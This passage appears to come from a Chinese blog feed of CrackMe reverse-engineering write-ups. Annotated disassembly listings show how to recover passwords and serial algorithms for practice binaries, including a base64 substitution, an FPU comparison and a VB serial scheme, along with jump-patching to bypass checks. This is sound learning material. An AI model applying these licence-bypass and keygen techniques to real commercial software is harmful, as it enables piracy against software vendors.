ucrtbase.6C2F8C67 |6C2F8C96 | 33 C0 | xor eax,eax | eax:&quot;OTacMDMzMTI=&quot;6C2F8C98 | 5E | pop esi | esi:&quot;TacMDMzMTI=&quot;6C2F8C99 | 5B | pop ebx |6C2F8C9A | C3 | ret |6C2F8C9B | EB 03 | jmp ucrtbase.6C2F8CA0 |6C2F8C9D | CC | int3 |6C2F8C9E | CC | int3 |6C2F8C9F | CC | int3 |6C2F8CA0 | 1B C0 | sbb eax,eax | eax:&quot;OTacMDMzMTI=&quot;6C2F8CA2 | 83 C8 01 | or eax,1 | eax:&quot;OTacMDMzMTI=&quot;6C2F8CA5 | 5E | pop esi | esi:&quot;TacMDMzMTI=&quot;6C2F8CA6 | 5B | pop ebx |6C2F8CA7 | C3 | ret | 这段代码的跳转比较复杂，我们主要看这段12345678910111213146C2F8C50 | 0F B6 04 0A | movzx eax,byte ptr ds:[edx+ecx] | edx+ecx*1:&quot;OTacMDMzMTI=&quot;6C2F8C54 | 3A 02 | cmp al,byte ptr ds:[edx] | edx:&quot;o2Ffx3V0OjJtYW5spQ==&quot;6C2F8C56 | 75 48 | jne ucrtbase.6C2F8CA0 |6C2F8C58 | 85 C0 | test eax,eax |6C2F8C5A | 74 3A | je ucrtbase.6C2F8C96 |6C2F8C5C | 42 | inc edx | edx:&quot;o2Ffx3V0OjJtYW5spQ==&quot;6C2F8C5D | 83 EB 01 | sub ebx,1 |6C2F8C60 | 76 34 | jbe ucrtbase.6C2F8C96 |6C2F8C62 | F6 C2 03 | test dl,3 |6C2F8C65 | 75 E9 | jne ucrtbase.6C2F8C50 |6C2F8C67 | 8D 04 0A | lea eax,dword ptr ds:[edx+ecx] | edx+ecx*1:&quot;OTacMDMzMTI=&quot;6C2F8C6A | 25 FF 0F 00 00 | and eax,FFF |6C2F8C6F | 3D FC 0F 00 00 | cmp eax,FFC |6C2F8C74 | 77 DA | ja ucrtbase.6C2F8C50 | 通读可以发现就是把我们输入的base64变形后的值(OTacMDMzMTI=)按字节取出来一一和内置的o2Ffx3V0OjJtYW5spQ==做比较，只有当全部相等才跳到这把eax置零16C2F8C96 | 33 C0 | xor eax,eax 然后退出函数 那么这个OTacMDMzMTI=是个什么呢？看着是个base64，但是我们解出来是96?3312，完全不是我们输入的97103012了，这个只怎么来的呢？我们继续看这段12345678910111213141516171819202122232425262728293031323334012411FF | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] |01241202 | E8 F9 FD FF FF | call reverse3.1241000 |base64(你的输入) -&gt; [ebp - 0x40]01241207 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] |0124120A | 83 C4 08 | add esp,8 |0124120D | 33 D2 | xor edx,edx | edx:&quot;97103012&quot;0124120F | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] |01241212 | 8A 01 | mov al,byte ptr ds:[ecx] |01241214 | 41 | inc ecx |01241215 | 84 C0 | test al,al |01241217 | 75 F9 | jne reverse3.1241212 |01241219 | 2B CE | sub ecx,esi | 长度（base64你的输入） -&gt; ecx0124121B | 74 37 | je reverse3.1241254 |0124121D | 0F 1F 00 | nop dword ptr ds:[eax] |01241220 | 8A 4C 15 C0 | mov cl,byte ptr ss:[ebp+edx-40] |01241224 | 33 C0 | xor eax,eax |01241226 | 3A 88 08 21 24 01 | cmp cl,byte ptr ds:[eax+1242108] | eax+1242108:&quot;abcdefghijklmnopqrstuvwxyz&quot;0124122C | 74 08 | je reverse3.1241236 |0124122E | 40 | inc eax |0124122F | 83 F8 1A | cmp eax,1A |01241232 | 72 F2 | jb reverse3.1241226 |01241234 | EB 0A | jmp reverse3.1241240 |01241236 | 8A 80 24 21 24 01 | mov al,byte ptr ds:[eax+1242124] | eax+1242124:&quot;wxabopdefghijklqrstuvyzcmn&quot;0124123C | 88 44 15 C0 | mov byte ptr ss:[ebp+edx-40],al |01241240 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] |01241243 | 42 | inc edx | edx:&quot;97103012&quot;01241244 | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] |01241247 | 8A 01 | mov al,byte ptr ds:[ecx] |01241249 | 41 | inc ecx |0124124A | 84 C0 | test al,al |0124124C | 75 F9 | jne reverse3.1241247 |0124124E | 2B CE | sub ecx,esi |01241250 | 3B D1 | cmp edx,ecx | edx:&quot;97103012&quot;01241252 | 72 CC | jb reverse3.1241220 |01241254 | 6A 14 | push 14 | 下面这行代码有兴趣的可以跟进去看看，其实就是base64编码，苦逼的我傻乎乎地跟完了101241202 | E8 F9 FD FF FF | call reverse3.1241000 |base64(你的输入) -&gt; [ebp - 0x40] 那97103012的base64是OTcxMDMwMTI=呀，这个OTacMDMzMTI=是怎么来的呢？我们看着一段123456789101112131415161718192001241220 | 8A 4C 15 C0 | mov cl,byte ptr ss:[ebp+edx-40] |01241224 | 33 C0 | xor eax,eax |01241226 | 3A 88 08 21 24 01 | cmp cl,byte ptr ds:[eax+1242108] | eax+1242108:&quot;abcdefghijklmnopqrstuvwxyz&quot;0124122C | 74 08 | je reverse3.1241236 |0124122E | 40 | inc eax |0124122F | 83 F8 1A | cmp eax,1A |01241232 | 72 F2 | jb reverse3.1241226 |01241234 | EB 0A | jmp reverse3.1241240 |01241236 | 8A 80 24 21 24 01 | mov al,byte ptr ds:[eax+1242124] | eax+1242124:&quot;wxabopdefghijklqrstuvyzcmn&quot;0124123C | 88 44 15 C0 | mov byte ptr ss:[ebp+edx-40],al |01241240 | 8D 4D C0 | lea ecx,dword ptr ss:[ebp-40] |01241243 | 42 | inc edx | edx:&quot;97103012&quot;01241244 | 8D 71 01 | lea esi,dword ptr ds:[ecx+1] |01241247 | 8A 01 | mov al,byte ptr ds:[ecx] |01241249 | 41 | inc ecx |0124124A | 84 C0 | test al,al |0124124C | 75 F9 | jne reverse3.1241247 |0124124E | 2B CE | sub ecx,esi |01241250 | 3B D1 | cmp edx,ecx | edx:&quot;97103012&quot;01241252 | 72 CC | jb reverse3.1241220 | 这一段的工作大家跟跟就知道，就是通过一次次循环将OTcxMDMwMTI=中的值通过下面这个对应关系一一置换12abcdefghijklmnopqrstuvwxyzwxabopdefghijklqrstuvyzcmn 所以OTcxMDMwMTI=变成了OTacMDMzMTI= 好的，我们看到了这里，相信已经知道密码是什么了，也就是我们变形后的base64值要等于o2Ffx3V0OjJtYW5spQ==那就倒着置换呗，得出来正确的base64是e2Fib3V0OmJsYW5rfQ==，解码为{about:blank} 例子CM]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一个涉及到浮点寄存器的CM]]></title>
      <url>%2F2017%2F09%2F18%2F%E4%B8%80%E4%B8%AA%E6%B6%89%E5%8F%8A%E5%88%B0%E6%B5%AE%E7%82%B9%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84CM.html</url>
      <content type="text"><![CDATA[这次找小伙伴要了他的一个CM，怎么说呢，这CM让我学到了不少，其实搞出来后感觉不难，就是有不少FPU浮点相关的指令和FPU寄存器完全没学过，查了不少资料，学到了很多打开是这样 无壳程序，我们直接od查找字符串，爆破我就不说了，直接改跳转我第一次是找到这个判断的函数开头，一行行快速单步，确实发现了输入，但是后来很多命令不懂意思我也单步，导致看到后来也不知道怎么判断的然后我改了策略，先逆着就近看看，怎么才能使条件成立12345678910111213141516171819202122232425262728004010EA |. F6C4 41 test ah,0x41 ; zf=0 -&gt; ah &amp; 0x41 != 0004010ED |. B8 00000000 mov eax,0x0004010F2 |. 0f95c0 setne al ; eax=1 -&gt; al=1 -&gt; zf=0004010F5 |. 8945 D0 mov [local.12],eax004010F8 |. 837D D0 01 cmp [local.12],0x1004010FC |. 0F85 39000000 jnz 测试.0040113B ; 要求zf=1，即eax=0x100401102 |. BB 06000000 mov ebx,0x600401107 |. E8 F8FEFFFF call 测试.004010040040110C |. 68 01030080 push 0x8000030100401111 |. 6A 00 push 0x000401113 |. 68 00000000 push 0x000401118 |. 68 04000080 push 0x800000040040111D |. 6A 00 push 0x00040111F |. 68 6D1B4800 push 测试.00481B6D ; 成功00401124 |. 68 04000000 push 0x400401129 |. BB 90164000 mov ebx,测试.004016900040112E |. E8 36010000 call 测试.0040126900401133 |. 83C4 34 add esp,0x3400401136 |. E9 34000000 jmp 测试.0040116F0040113B |&gt; BB 06000000 mov ebx,0x600401140 |. E8 BFFEFFFF call 测试.0040100400401145 |. 68 01030080 push 0x800003010040114A |. 6A 00 push 0x00040114C |. 68 00000000 push 0x000401151 |. 68 04000080 push 0x8000000400401156 |. 6A 00 push 0x000401158 |. 68 721B4800 push 测试.00481B72 ; 失败0040115D |. 68 04000000 push 0x4 也就是说需要找ah相关的接下来我们整体看看，因为第一次接触FPU浮点相关的指令和FPU寄存器，所以注释写的比较繁琐，望大家见谅123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596970040100C /. 55 push ebp0040100D |. 8BEC mov ebp,esp0040100F |. 81EC 34000000 sub esp,0x3400401015 |. 6A FF push -0x100401017 |. 6A 08 push 0x800401019 |. 68 02000116 push 0x160100020040101E |. 68 01000152 push 0x5201000100401023 |. E8 47020000 call 测试.0040126F ; 执行后 输入的密码 -&gt; eax(1886b8)00401028 |. 83C4 10 add esp,0x100040102B |. 8945 FC mov [local.1],eax ; eax中你的输入 -&gt; ebp-40040102E |. 68 04000080 push 0x8000000400401033 |. 6A 00 push 0x000401035 |. 8B45 FC mov eax,[local.1]00401038 |. 85C0 test eax,eax0040103A |. 75 05 jnz short 测试.004010410040103C |. B8 5C1B4800 mov eax,测试.00481B5C00401041 |&gt; 50 push eax00401042 |. 68 01000000 push 0x100401047 |. BB A0134000 mov ebx,测试.004013A00040104C |. E8 18020000 call 测试.00401269 ; eax=16进制(你的输入) ecx=000401051 |. 83C4 10 add esp,0x10 ; esp = 1000b00401054 |. 8945 F8 mov [local.2],eax ; 16进制(你的输入) -&gt; local.200401057 |. 8B5D FC mov ebx,[local.1] ; 你的输入 -&gt; ebx0040105A |. 85DB test ebx,ebx0040105C |. 74 09 je short 测试.004010670040105E |. 53 push ebx ; 输入压栈 ebp-38 local.140040105F |. E8 F9010000 call 测试.0040125D00401064 |. 83C4 04 add esp,0x4 ; [ebp-38] + 400401067 |&gt; DB45 F8 fild [local.2] ; 十进制浮点(输入) -&gt; st00040106A |. DD5D F0 fstp qword ptr ss:[ebp-0x10] ; st0 -&gt; ebp-10H0040106D |. DD45 F0 fld qword ptr ss:[ebp-0x10] ; ebp-10 -&gt; st000401070 |. DC05 5D1B4800 fadd qword ptr ds:[0x481B5D] ; st0 = st0 + 52000401076 |. DD5D E8 fstp qword ptr ss:[ebp-0x18] ; 十进制你的输入+520 -&gt; ebp-18H00401079 |. 6A FF push -0x10040107B |. 6A 08 push 0x80040107D |. 68 03000116 push 0x1601000300401082 |. 68 01000152 push 0x5201000100401087 |. E8 E3010000 call 测试.0040126F0040108C |. 83C4 10 add esp,0x100040108F |. 8945 E4 mov [local.7],eax00401092 |. 68 04000080 push 0x8000000400401097 |. 6A 00 push 0x000401099 |. 8B45 E4 mov eax,[local.7]0040109C |. 85C0 test eax,eax0040109E |. 75 05 jnz short 测试.004010A5004010A0 |. B8 5C1B4800 mov eax,测试.00481B5C004010A5 |&gt; 50 push eax004010A6 |. 68 01000000 push 0x1004010AB |. BB A0134000 mov ebx,测试.004013A0004010B0 |. E8 B4010000 call 测试.00401269004010B5 |. 83C4 10 add esp,0x10004010B8 |. 8945 E0 mov [local.8],eax004010BB |. 8B5D E4 mov ebx,[local.7]004010BE |. 85DB test ebx,ebx004010C0 |. 74 09 je short 测试.004010CB004010C2 |. 53 push ebx004010C3 |. E8 95010000 call 测试.0040125D004010C8 |. 83C4 04 add esp,0x4004010CB |&gt; DB45 E0 fild [local.8] ; (641)10 -&gt; st0004010CE |. DD5D D8 fstp qword ptr ss:[ebp-0x28] ; st0 -&gt; ebp-28H004010D1 |. DD45 E8 fld qword ptr ss:[ebp-0x18] ; [ebp-18H](十进制你的输入+520) -&gt; st0004010D4 |. DC65 D8 fsub qword ptr ss:[ebp-0x28] ; st0 = st0 - [ebp-28H] (641)10004010D7 |. D9E4 ftst ; st0和0.0比较，据此设置FPU状态字C0,C2,C3位004010D9 |. DFE0 fstsw ax004010DB |. F6C4 01 test ah,0x1004010DE |. 74 02 je short 测试.004010E2004010E0 |. D9E0 fchs ; st0改变符号位004010E2 |&gt; DC1D 651B4800 fcomp qword ptr ds:[0x481B65] ; st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65]004010E8 |. DFE0 fstsw ax ; FPU状态字 -&gt; eax，根据下面可知，FPU状态字C0或C3为1均可004010EA |. F6C4 41 test ah,0x41 ; zf=0 -&gt; ah &amp; 0x41 != 0004010ED |. B8 00000000 mov eax,0x0004010F2 |. 0f95c0 setne al ; eax=1 -&gt; al=1 -&gt; zf=0004010F5 |. 8945 D0 mov [local.12],eax004010F8 |. 837D D0 01 cmp [local.12],0x1004010FC |. 0F85 39000000 jnz 测试.0040113B ; 要求zf=1，即eax=0x100401102 |. BB 06000000 mov ebx,0x600401107 |. E8 F8FEFFFF call 测试.004010040040110C |. 68 01030080 push 0x8000030100401111 |. 6A 00 push 0x000401113 |. 68 00000000 push 0x000401118 |. 68 04000080 push 0x800000040040111D |. 6A 00 push 0x00040111F |. 68 6D1B4800 push 测试.00481B6D ; 成功00401124 |. 68 04000000 push 0x400401129 |. BB 90164000 mov ebx,测试.004016900040112E |. E8 36010000 call 测试.0040126900401133 |. 83C4 34 add esp,0x3400401136 |. E9 34000000 jmp 测试.0040116F0040113B |&gt; BB 06000000 mov ebx,0x600401140 |. E8 BFFEFFFF call 测试.0040100400401145 |. 68 01030080 push 0x800003010040114A |. 6A 00 push 0x00040114C |. 68 00000000 push 0x000401151 |. 68 04000080 push 0x8000000400401156 |. 6A 00 push 0x000401158 |. 68 721B4800 push 测试.00481B72 ; 失败0040115D |. 68 04000000 push 0x4 那么回到上面的问题，ah的值是从哪来的，我们在004010E8处可以看到，FPU状态码进了eax那么根据我们的判断ah &amp; 0x41 != 0，能得出对FPU状态字有什么要求呢？我们看这张图 也就是说12345 0100 0001&amp; -x-- -yzt---------------- 真其中x代表C3，y代表C2，z代表C1,t代表C0 根据上面的判断，也就是说只能C3或C0为1 C3为1的话 1004010E2 |&gt; DC1D 651B4800 fcomp qword ptr ds:[0x481B65] ; st0和[481B65](无限接近0的一个正浮点数)比较，据此设置FPU状态字C0,C2,C3位，并把st0弹到[481B65] 这段就是st0等于一个无限接近0的浮点数才能使C3为1，但是根据我们之前的st0 = st0 = 你的输入+520-641，st0不可能是等于一个无限接近0的浮点数，所以C3为1排除 fcomp命令参考处 C0为1的话C0为1是怎么来的呢？只有两个地方涉及到了FPU状态字的改变，分别是4010D7和4010E24010E2处要使C0为1，必须st0小于那个无限接近0的浮点数，这个条件不足以我们判断，接着往上看4010D7处要使C0为1，必须st0等于0.0，也就是你的输入+520-641=0 ftst命令参考处 所以至此我们就得到了密码密码+520-641=0 ==&gt; 密码=121 这个CM怎么说呢，我刚开始是没想到会涉及到浮点寄存器的，因为我还没学这个，不过后来追到快判断的地方时，发现了FPU状态码进入eax参与过程了，然后查了关于FPU 状态寄存器的资料，就可以搞出来了]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[160CrackMe练手 002]]></title>
      <url>%2F2017%2F09%2F16%2F160CrackMe-002.html</url>
      <content type="text"><![CDATA[首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段代码用来提升堆栈，找到后我们往下找，注意堆栈，直到我们输入的字符出现，开始细心往下跟 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611711811912012112212312412512612712812913013113213313413513613713813914014114214314414514614714814915015115215315415515615715815916016116216316416516616716816917017117217317417517617717817918018118218318418518618718818919019119219319419519619719819920020120220320420520620720820921021121221321421521621721821922022122222322422522622722822923023123223323423523623723823924024124224324424524624724824925025125225325400402310 &gt; \55 push ebp00402311 . 8BEC mov ebp,esp00402313 . 83EC 0C sub esp,0xC00402316 . 68 26104000 push &lt;jmp.&amp;MSVBVM50.__vbaExceptHandler&gt; ; SE 处理程序安装0040231B . 64:A1 0000000&gt;mov eax,dword ptr fs:[0]00402321 . 50 push eax ; Afkayas_.0040219100402322 . 64:8925 00000&gt;mov dword ptr fs:[0],esp00402329 . 81EC B0000000 sub esp,0xB00040232F . 53 push ebx00402330 . 56 push esi00402331 . 8B75 08 mov esi,dword ptr ss:[ebp+0x8] ; esi -&gt; ASCII &quot;2@&quot;00402334 . 57 push edi00402335 . 8BC6 mov eax,esi ; eax -&gt; ASCII &quot;2@&quot;00402337 . 83E6 FE and esi,-0x20040233A . 8965 F4 mov dword ptr ss:[ebp-0xC],esp0040233D . 83E0 01 and eax,0x100402340 . 8B1E mov ebx,dword ptr ds:[esi]00402342 . C745 F8 08104&gt;mov dword ptr ss:[ebp-0x8],Afkayas_.0040&gt;00402349 . 56 push esi0040234A . 8945 FC mov dword ptr ss:[ebp-0x4],eax ; Afkayas_.004021910040234D . 8975 08 mov dword ptr ss:[ebp+0x8],esi00402350 . FF53 04 call dword ptr ds:[ebx+0x4] ; msvbvm50.7404C5C800402353 . 8B83 10030000 mov eax,dword ptr ds:[ebx+0x310]00402359 . 33FF xor edi,edi0040235B . 56 push esi0040235C . 897D E8 mov dword ptr ss:[ebp-0x18],edi0040235F . 897D E4 mov dword ptr ss:[ebp-0x1C],edi00402362 . 897D E0 mov dword ptr ss:[ebp-0x20],edi00402365 . 897D DC mov dword ptr ss:[ebp-0x24],edi00402368 . 897D D8 mov dword ptr ss:[ebp-0x28],edi0040236B . 897D D4 mov dword ptr ss:[ebp-0x2C],edi0040236E . 897D C4 mov dword ptr ss:[ebp-0x3C],edi00402371 . 897D B4 mov dword ptr ss:[ebp-0x4C],edi00402374 . 897D A4 mov dword ptr ss:[ebp-0x5C],edi00402377 . 897D 94 mov dword ptr ss:[ebp-0x6C],edi0040237A . 8985 40FFFFFF mov dword ptr ss:[ebp-0xC0],eax ; Afkayas_.0040219100402380 . FFD0 call eax ; Afkayas_.0040219100402382 . 8D4D D4 lea ecx,dword ptr ss:[ebp-0x2C]00402385 . 50 push eax ; Afkayas_.0040219100402386 . 51 push ecx00402387 . FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;; msvbvm50.__vbaObjSet0040238D . 8B9B 00030000 mov ebx,dword ptr ds:[ebx+0x300]00402393 . 56 push esi00402394 . 8985 50FFFFFF mov dword ptr ss:[ebp-0xB0],eax ; Afkayas_.004021910040239A . 899D 3CFFFFFF mov dword ptr ss:[ebp-0xC4],ebx004023A0 . FFD3 call ebx004023A2 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24]004023A5 . 50 push eax ; Afkayas_.00402191004023A6 . 52 push edx004023A7 . FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;; msvbvm50.__vbaObjSet004023AD . 8BD8 mov ebx,eax ; Afkayas_.00402191004023AF . 8D4D E8 lea ecx,dword ptr ss:[ebp-0x18]004023B2 . 51 push ecx004023B3 . 53 push ebx004023B4 . 8B03 mov eax,dword ptr ds:[ebx]004023B6 . FF90 A0000000 call dword ptr ds:[eax+0xA0]004023BC . 3BC7 cmp eax,edi004023BE . 7D 12 jge short Afkayas_.004023D2004023C0 . 68 A0000000 push 0xA0004023C5 . 68 5C1B4000 push Afkayas_.00401B5C004023CA . 53 push ebx004023CB . 50 push eax ; Afkayas_.00402191004023CC . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj004023D2 &gt; 56 push esi004023D3 . FF95 3CFFFFFF call dword ptr ss:[ebp-0xC4]004023D9 . 8D55 D8 lea edx,dword ptr ss:[ebp-0x28]004023DC . 50 push eax ; Afkayas_.00402191004023DD . 52 push edx004023DE . FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;; msvbvm50.__vbaObjSet004023E4 . 8BD8 mov ebx,eax ; Afkayas_.00402191004023E6 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C]004023E9 . 51 push ecx004023EA . 53 push ebx004023EB . 8B03 mov eax,dword ptr ds:[ebx]004023ED . FF90 A0000000 call dword ptr ds:[eax+0xA0]004023F3 . 3BC7 cmp eax,edi004023F5 . 7D 12 jge short Afkayas_.00402409004023F7 . 68 A0000000 push 0xA0004023FC . 68 5C1B4000 push Afkayas_.00401B5C00402401 . 53 push ebx00402402 . 50 push eax ; Afkayas_.0040219100402403 . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj00402409 &gt; 8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]0040240F . 8B45 E4 mov eax,dword ptr ss:[ebp-0x1C] ; 用户名 -&gt; eax00402412 . 50 push eax ; /用户名 -&gt; 堆栈00402413 . 8B1A mov ebx,dword ptr ds:[edx] ; |00402415 . FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax0040241B . 8BF8 mov edi,eax ; len(用户名) -&gt; edi0040241D . 8B4D E8 mov ecx,dword ptr ss:[ebp-0x18] ; 用户名 -&gt; ecx00402420 . 69FF FB7C0100 imul edi,edi,0x17CFB ; len(用户名) * 0x17CFB ==&gt; edi=A6ADD00402426 . 51 push ecx ; /String = NULL00402427 . 0F80 91020000 jo Afkayas_.004026BE ; |0040242D . FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx00402433 . 0FBFD0 movsx edx,ax00402436 . 03FA add edi,edx00402438 . 0F80 80020000 jo Afkayas_.004026BE0040243E . 57 push edi ; len(用户名) * 0x17CFB 入栈-&gt; ebp-D40040243F . FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;; 十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 -&gt; eax00402445 . 8BD0 mov edx,eax ; Afkayas_.0040219100402447 . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]0040244A . FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;; msvbvm50.__vbaStrMove00402450 . 8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]00402456 . 50 push eax ; Afkayas_.0040219100402457 . 57 push edi ; 十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈 -&gt; ebp-D400402458 . FF93 A4000000 call dword ptr ds:[ebx+0xA4]0040245E . 85C0 test eax,eax ; Afkayas_.0040219100402460 . 7D 12 jge short Afkayas_.0040247400402462 . 68 A4000000 push 0xA400402467 . 68 5C1B4000 push Afkayas_.00401B5C0040246C . 57 push edi0040246D . 50 push eax ; Afkayas_.004021910040246E . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj00402474 &gt; 8D45 E0 lea eax,dword ptr ss:[ebp-0x20]00402477 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C]0040247A . 50 push eax ; Afkayas_.004021910040247B . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18]0040247E . 51 push ecx0040247F . 52 push edx00402480 . 6A 03 push 0x300402482 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; msvbvm50.__vbaFreeStrList00402488 . 83C4 10 add esp,0x100040248B . 8D45 D4 lea eax,dword ptr ss:[ebp-0x2C]0040248E . 8D4D D8 lea ecx,dword ptr ss:[ebp-0x28]00402491 . 8D55 DC lea edx,dword ptr ss:[ebp-0x24]00402494 . 50 push eax ; Afkayas_.0040219100402495 . 51 push ecx00402496 . 52 push edx00402497 . 6A 03 push 0x300402499 . FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;; msvbvm50.__vbaFreeObjList0040249F . 8B06 mov eax,dword ptr ds:[esi]004024A1 . 83C4 10 add esp,0x10004024A4 . 56 push esi004024A5 . FF90 04030000 call dword ptr ds:[eax+0x304]004024AB . 8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaOb&gt;; msvbvm50.__vbaObjSet004024B1 . 50 push eax ; Afkayas_.00402191004024B2 . 8D45 DC lea eax,dword ptr ss:[ebp-0x24]004024B5 . 50 push eax ; Afkayas_.00402191004024B6 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaObjSet&gt;004024B8 . 8BF8 mov edi,eax ; Afkayas_.00402191004024BA . 8D55 E8 lea edx,dword ptr ss:[ebp-0x18]004024BD . 52 push edx004024BE . 57 push edi004024BF . 8B0F mov ecx,dword ptr ds:[edi]004024C1 . FF91 A0000000 call dword ptr ds:[ecx+0xA0]004024C7 . 85C0 test eax,eax ; Afkayas_.00402191004024C9 . 7D 12 jge short Afkayas_.004024DD004024CB . 68 A0000000 push 0xA0004024D0 . 68 5C1B4000 push Afkayas_.00401B5C004024D5 . 57 push edi004024D6 . 50 push eax ; Afkayas_.00402191004024D7 . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj004024DD &gt; 56 push esi004024DE . FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]004024E4 . 50 push eax ; Afkayas_.00402191004024E5 . 8D45 D8 lea eax,dword ptr ss:[ebp-0x28]004024E8 . 50 push eax ; Afkayas_.00402191004024E9 . FFD3 call ebx004024EB . 8BF0 mov esi,eax ; Afkayas_.00402191004024ED . 8D55 E4 lea edx,dword ptr ss:[ebp-0x1C]004024F0 . 52 push edx004024F1 . 56 push esi004024F2 . 8B0E mov ecx,dword ptr ds:[esi]004024F4 . FF91 A0000000 call dword ptr ds:[ecx+0xA0]004024FA . 85C0 test eax,eax ; Afkayas_.00402191004024FC . 7D 12 jge short Afkayas_.00402510004024FE . 68 A0000000 push 0xA000402503 . 68 5C1B4000 push Afkayas_.00401B5C00402508 . 56 push esi00402509 . 50 push eax ; Afkayas_.004021910040250A . FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;; msvbvm50.__vbaHresultCheckObj00402510 &gt; 8B45 E8 mov eax,dword ptr ss:[ebp-0x18] ; user32.77D2BBF700402513 . 8B4D E4 mov ecx,dword ptr ss:[ebp-0x1C]00402516 . 8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;; 十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 -&gt; ecx 密码 -&gt; eax0040251C . 50 push eax ; Afkayas_.004021910040251D . 68 701B4000 push Afkayas_.00401B70 ; &quot;AKA-&quot;入栈00402522 . 51 push ecx ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈00402523 . FFD7 call edi ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot; -&gt; eax00402525 . 8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;; msvbvm50.__vbaStrMove0040252B . 8BD0 mov edx,eax ; Afkayas_.004021910040252D . 8D4D E0 lea ecx,dword ptr ss:[ebp-0x20]00402530 . FFD3 call ebx ; &lt;&amp;MSVBVM50.__vbaStrMove&gt;00402532 . 50 push eax ; Afkayas_.0040219100402533 . FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCm&gt;; msvbvm50.__vbaStrCmp00402539 . 8BF0 mov esi,eax ; Afkayas_.004021910040253B . 8D55 E0 lea edx,dword ptr ss:[ebp-0x20]0040253E . F7DE neg esi00402540 . 8D45 E8 lea eax,dword ptr ss:[ebp-0x18]00402543 . 52 push edx00402544 . 1BF6 sbb esi,esi00402546 . 8D4D E4 lea ecx,dword ptr ss:[ebp-0x1C]00402549 . 50 push eax ; Afkayas_.004021910040254A . 46 inc esi0040254B . 51 push ecx0040254C . 6A 03 push 0x30040254E . F7DE neg esi00402550 . FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;; msvbvm50.__vbaFreeStrList00402556 . 83C4 10 add esp,0x1000402559 . 8D55 D8 lea edx,dword ptr ss:[ebp-0x28]0040255C . 8D45 DC lea eax,dword ptr ss:[ebp-0x24]0040255F . 52 push edx00402560 . 50 push eax ; Afkayas_.0040219100402561 . 6A 02 push 0x200402563 . FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;; msvbvm50.__vbaFreeObjList00402569 . 83C4 0C add esp,0xC0040256C . B9 04000280 mov ecx,0x8002000400402571 . B8 0A000000 mov eax,0xA00402576 . 894D 9C mov dword ptr ss:[ebp-0x64],ecx00402579 . 66:85F6 test si,si0040257C . 8945 94 mov dword ptr ss:[ebp-0x6C],eax ; Afkayas_.004021910040257F . 894D AC mov dword ptr ss:[ebp-0x54],ecx00402582 . 8945 A4 mov dword ptr ss:[ebp-0x5C],eax ; Afkayas_.0040219100402585 . 894D BC mov dword ptr ss:[ebp-0x44],ecx00402588 . 8945 B4 mov dword ptr ss:[ebp-0x4C],eax ; Afkayas_.004021910040258B . 74 58 je short Afkayas_.004025E50040258D . 68 801B4000 push Afkayas_.00401B80 ; You Get It00402592 . 68 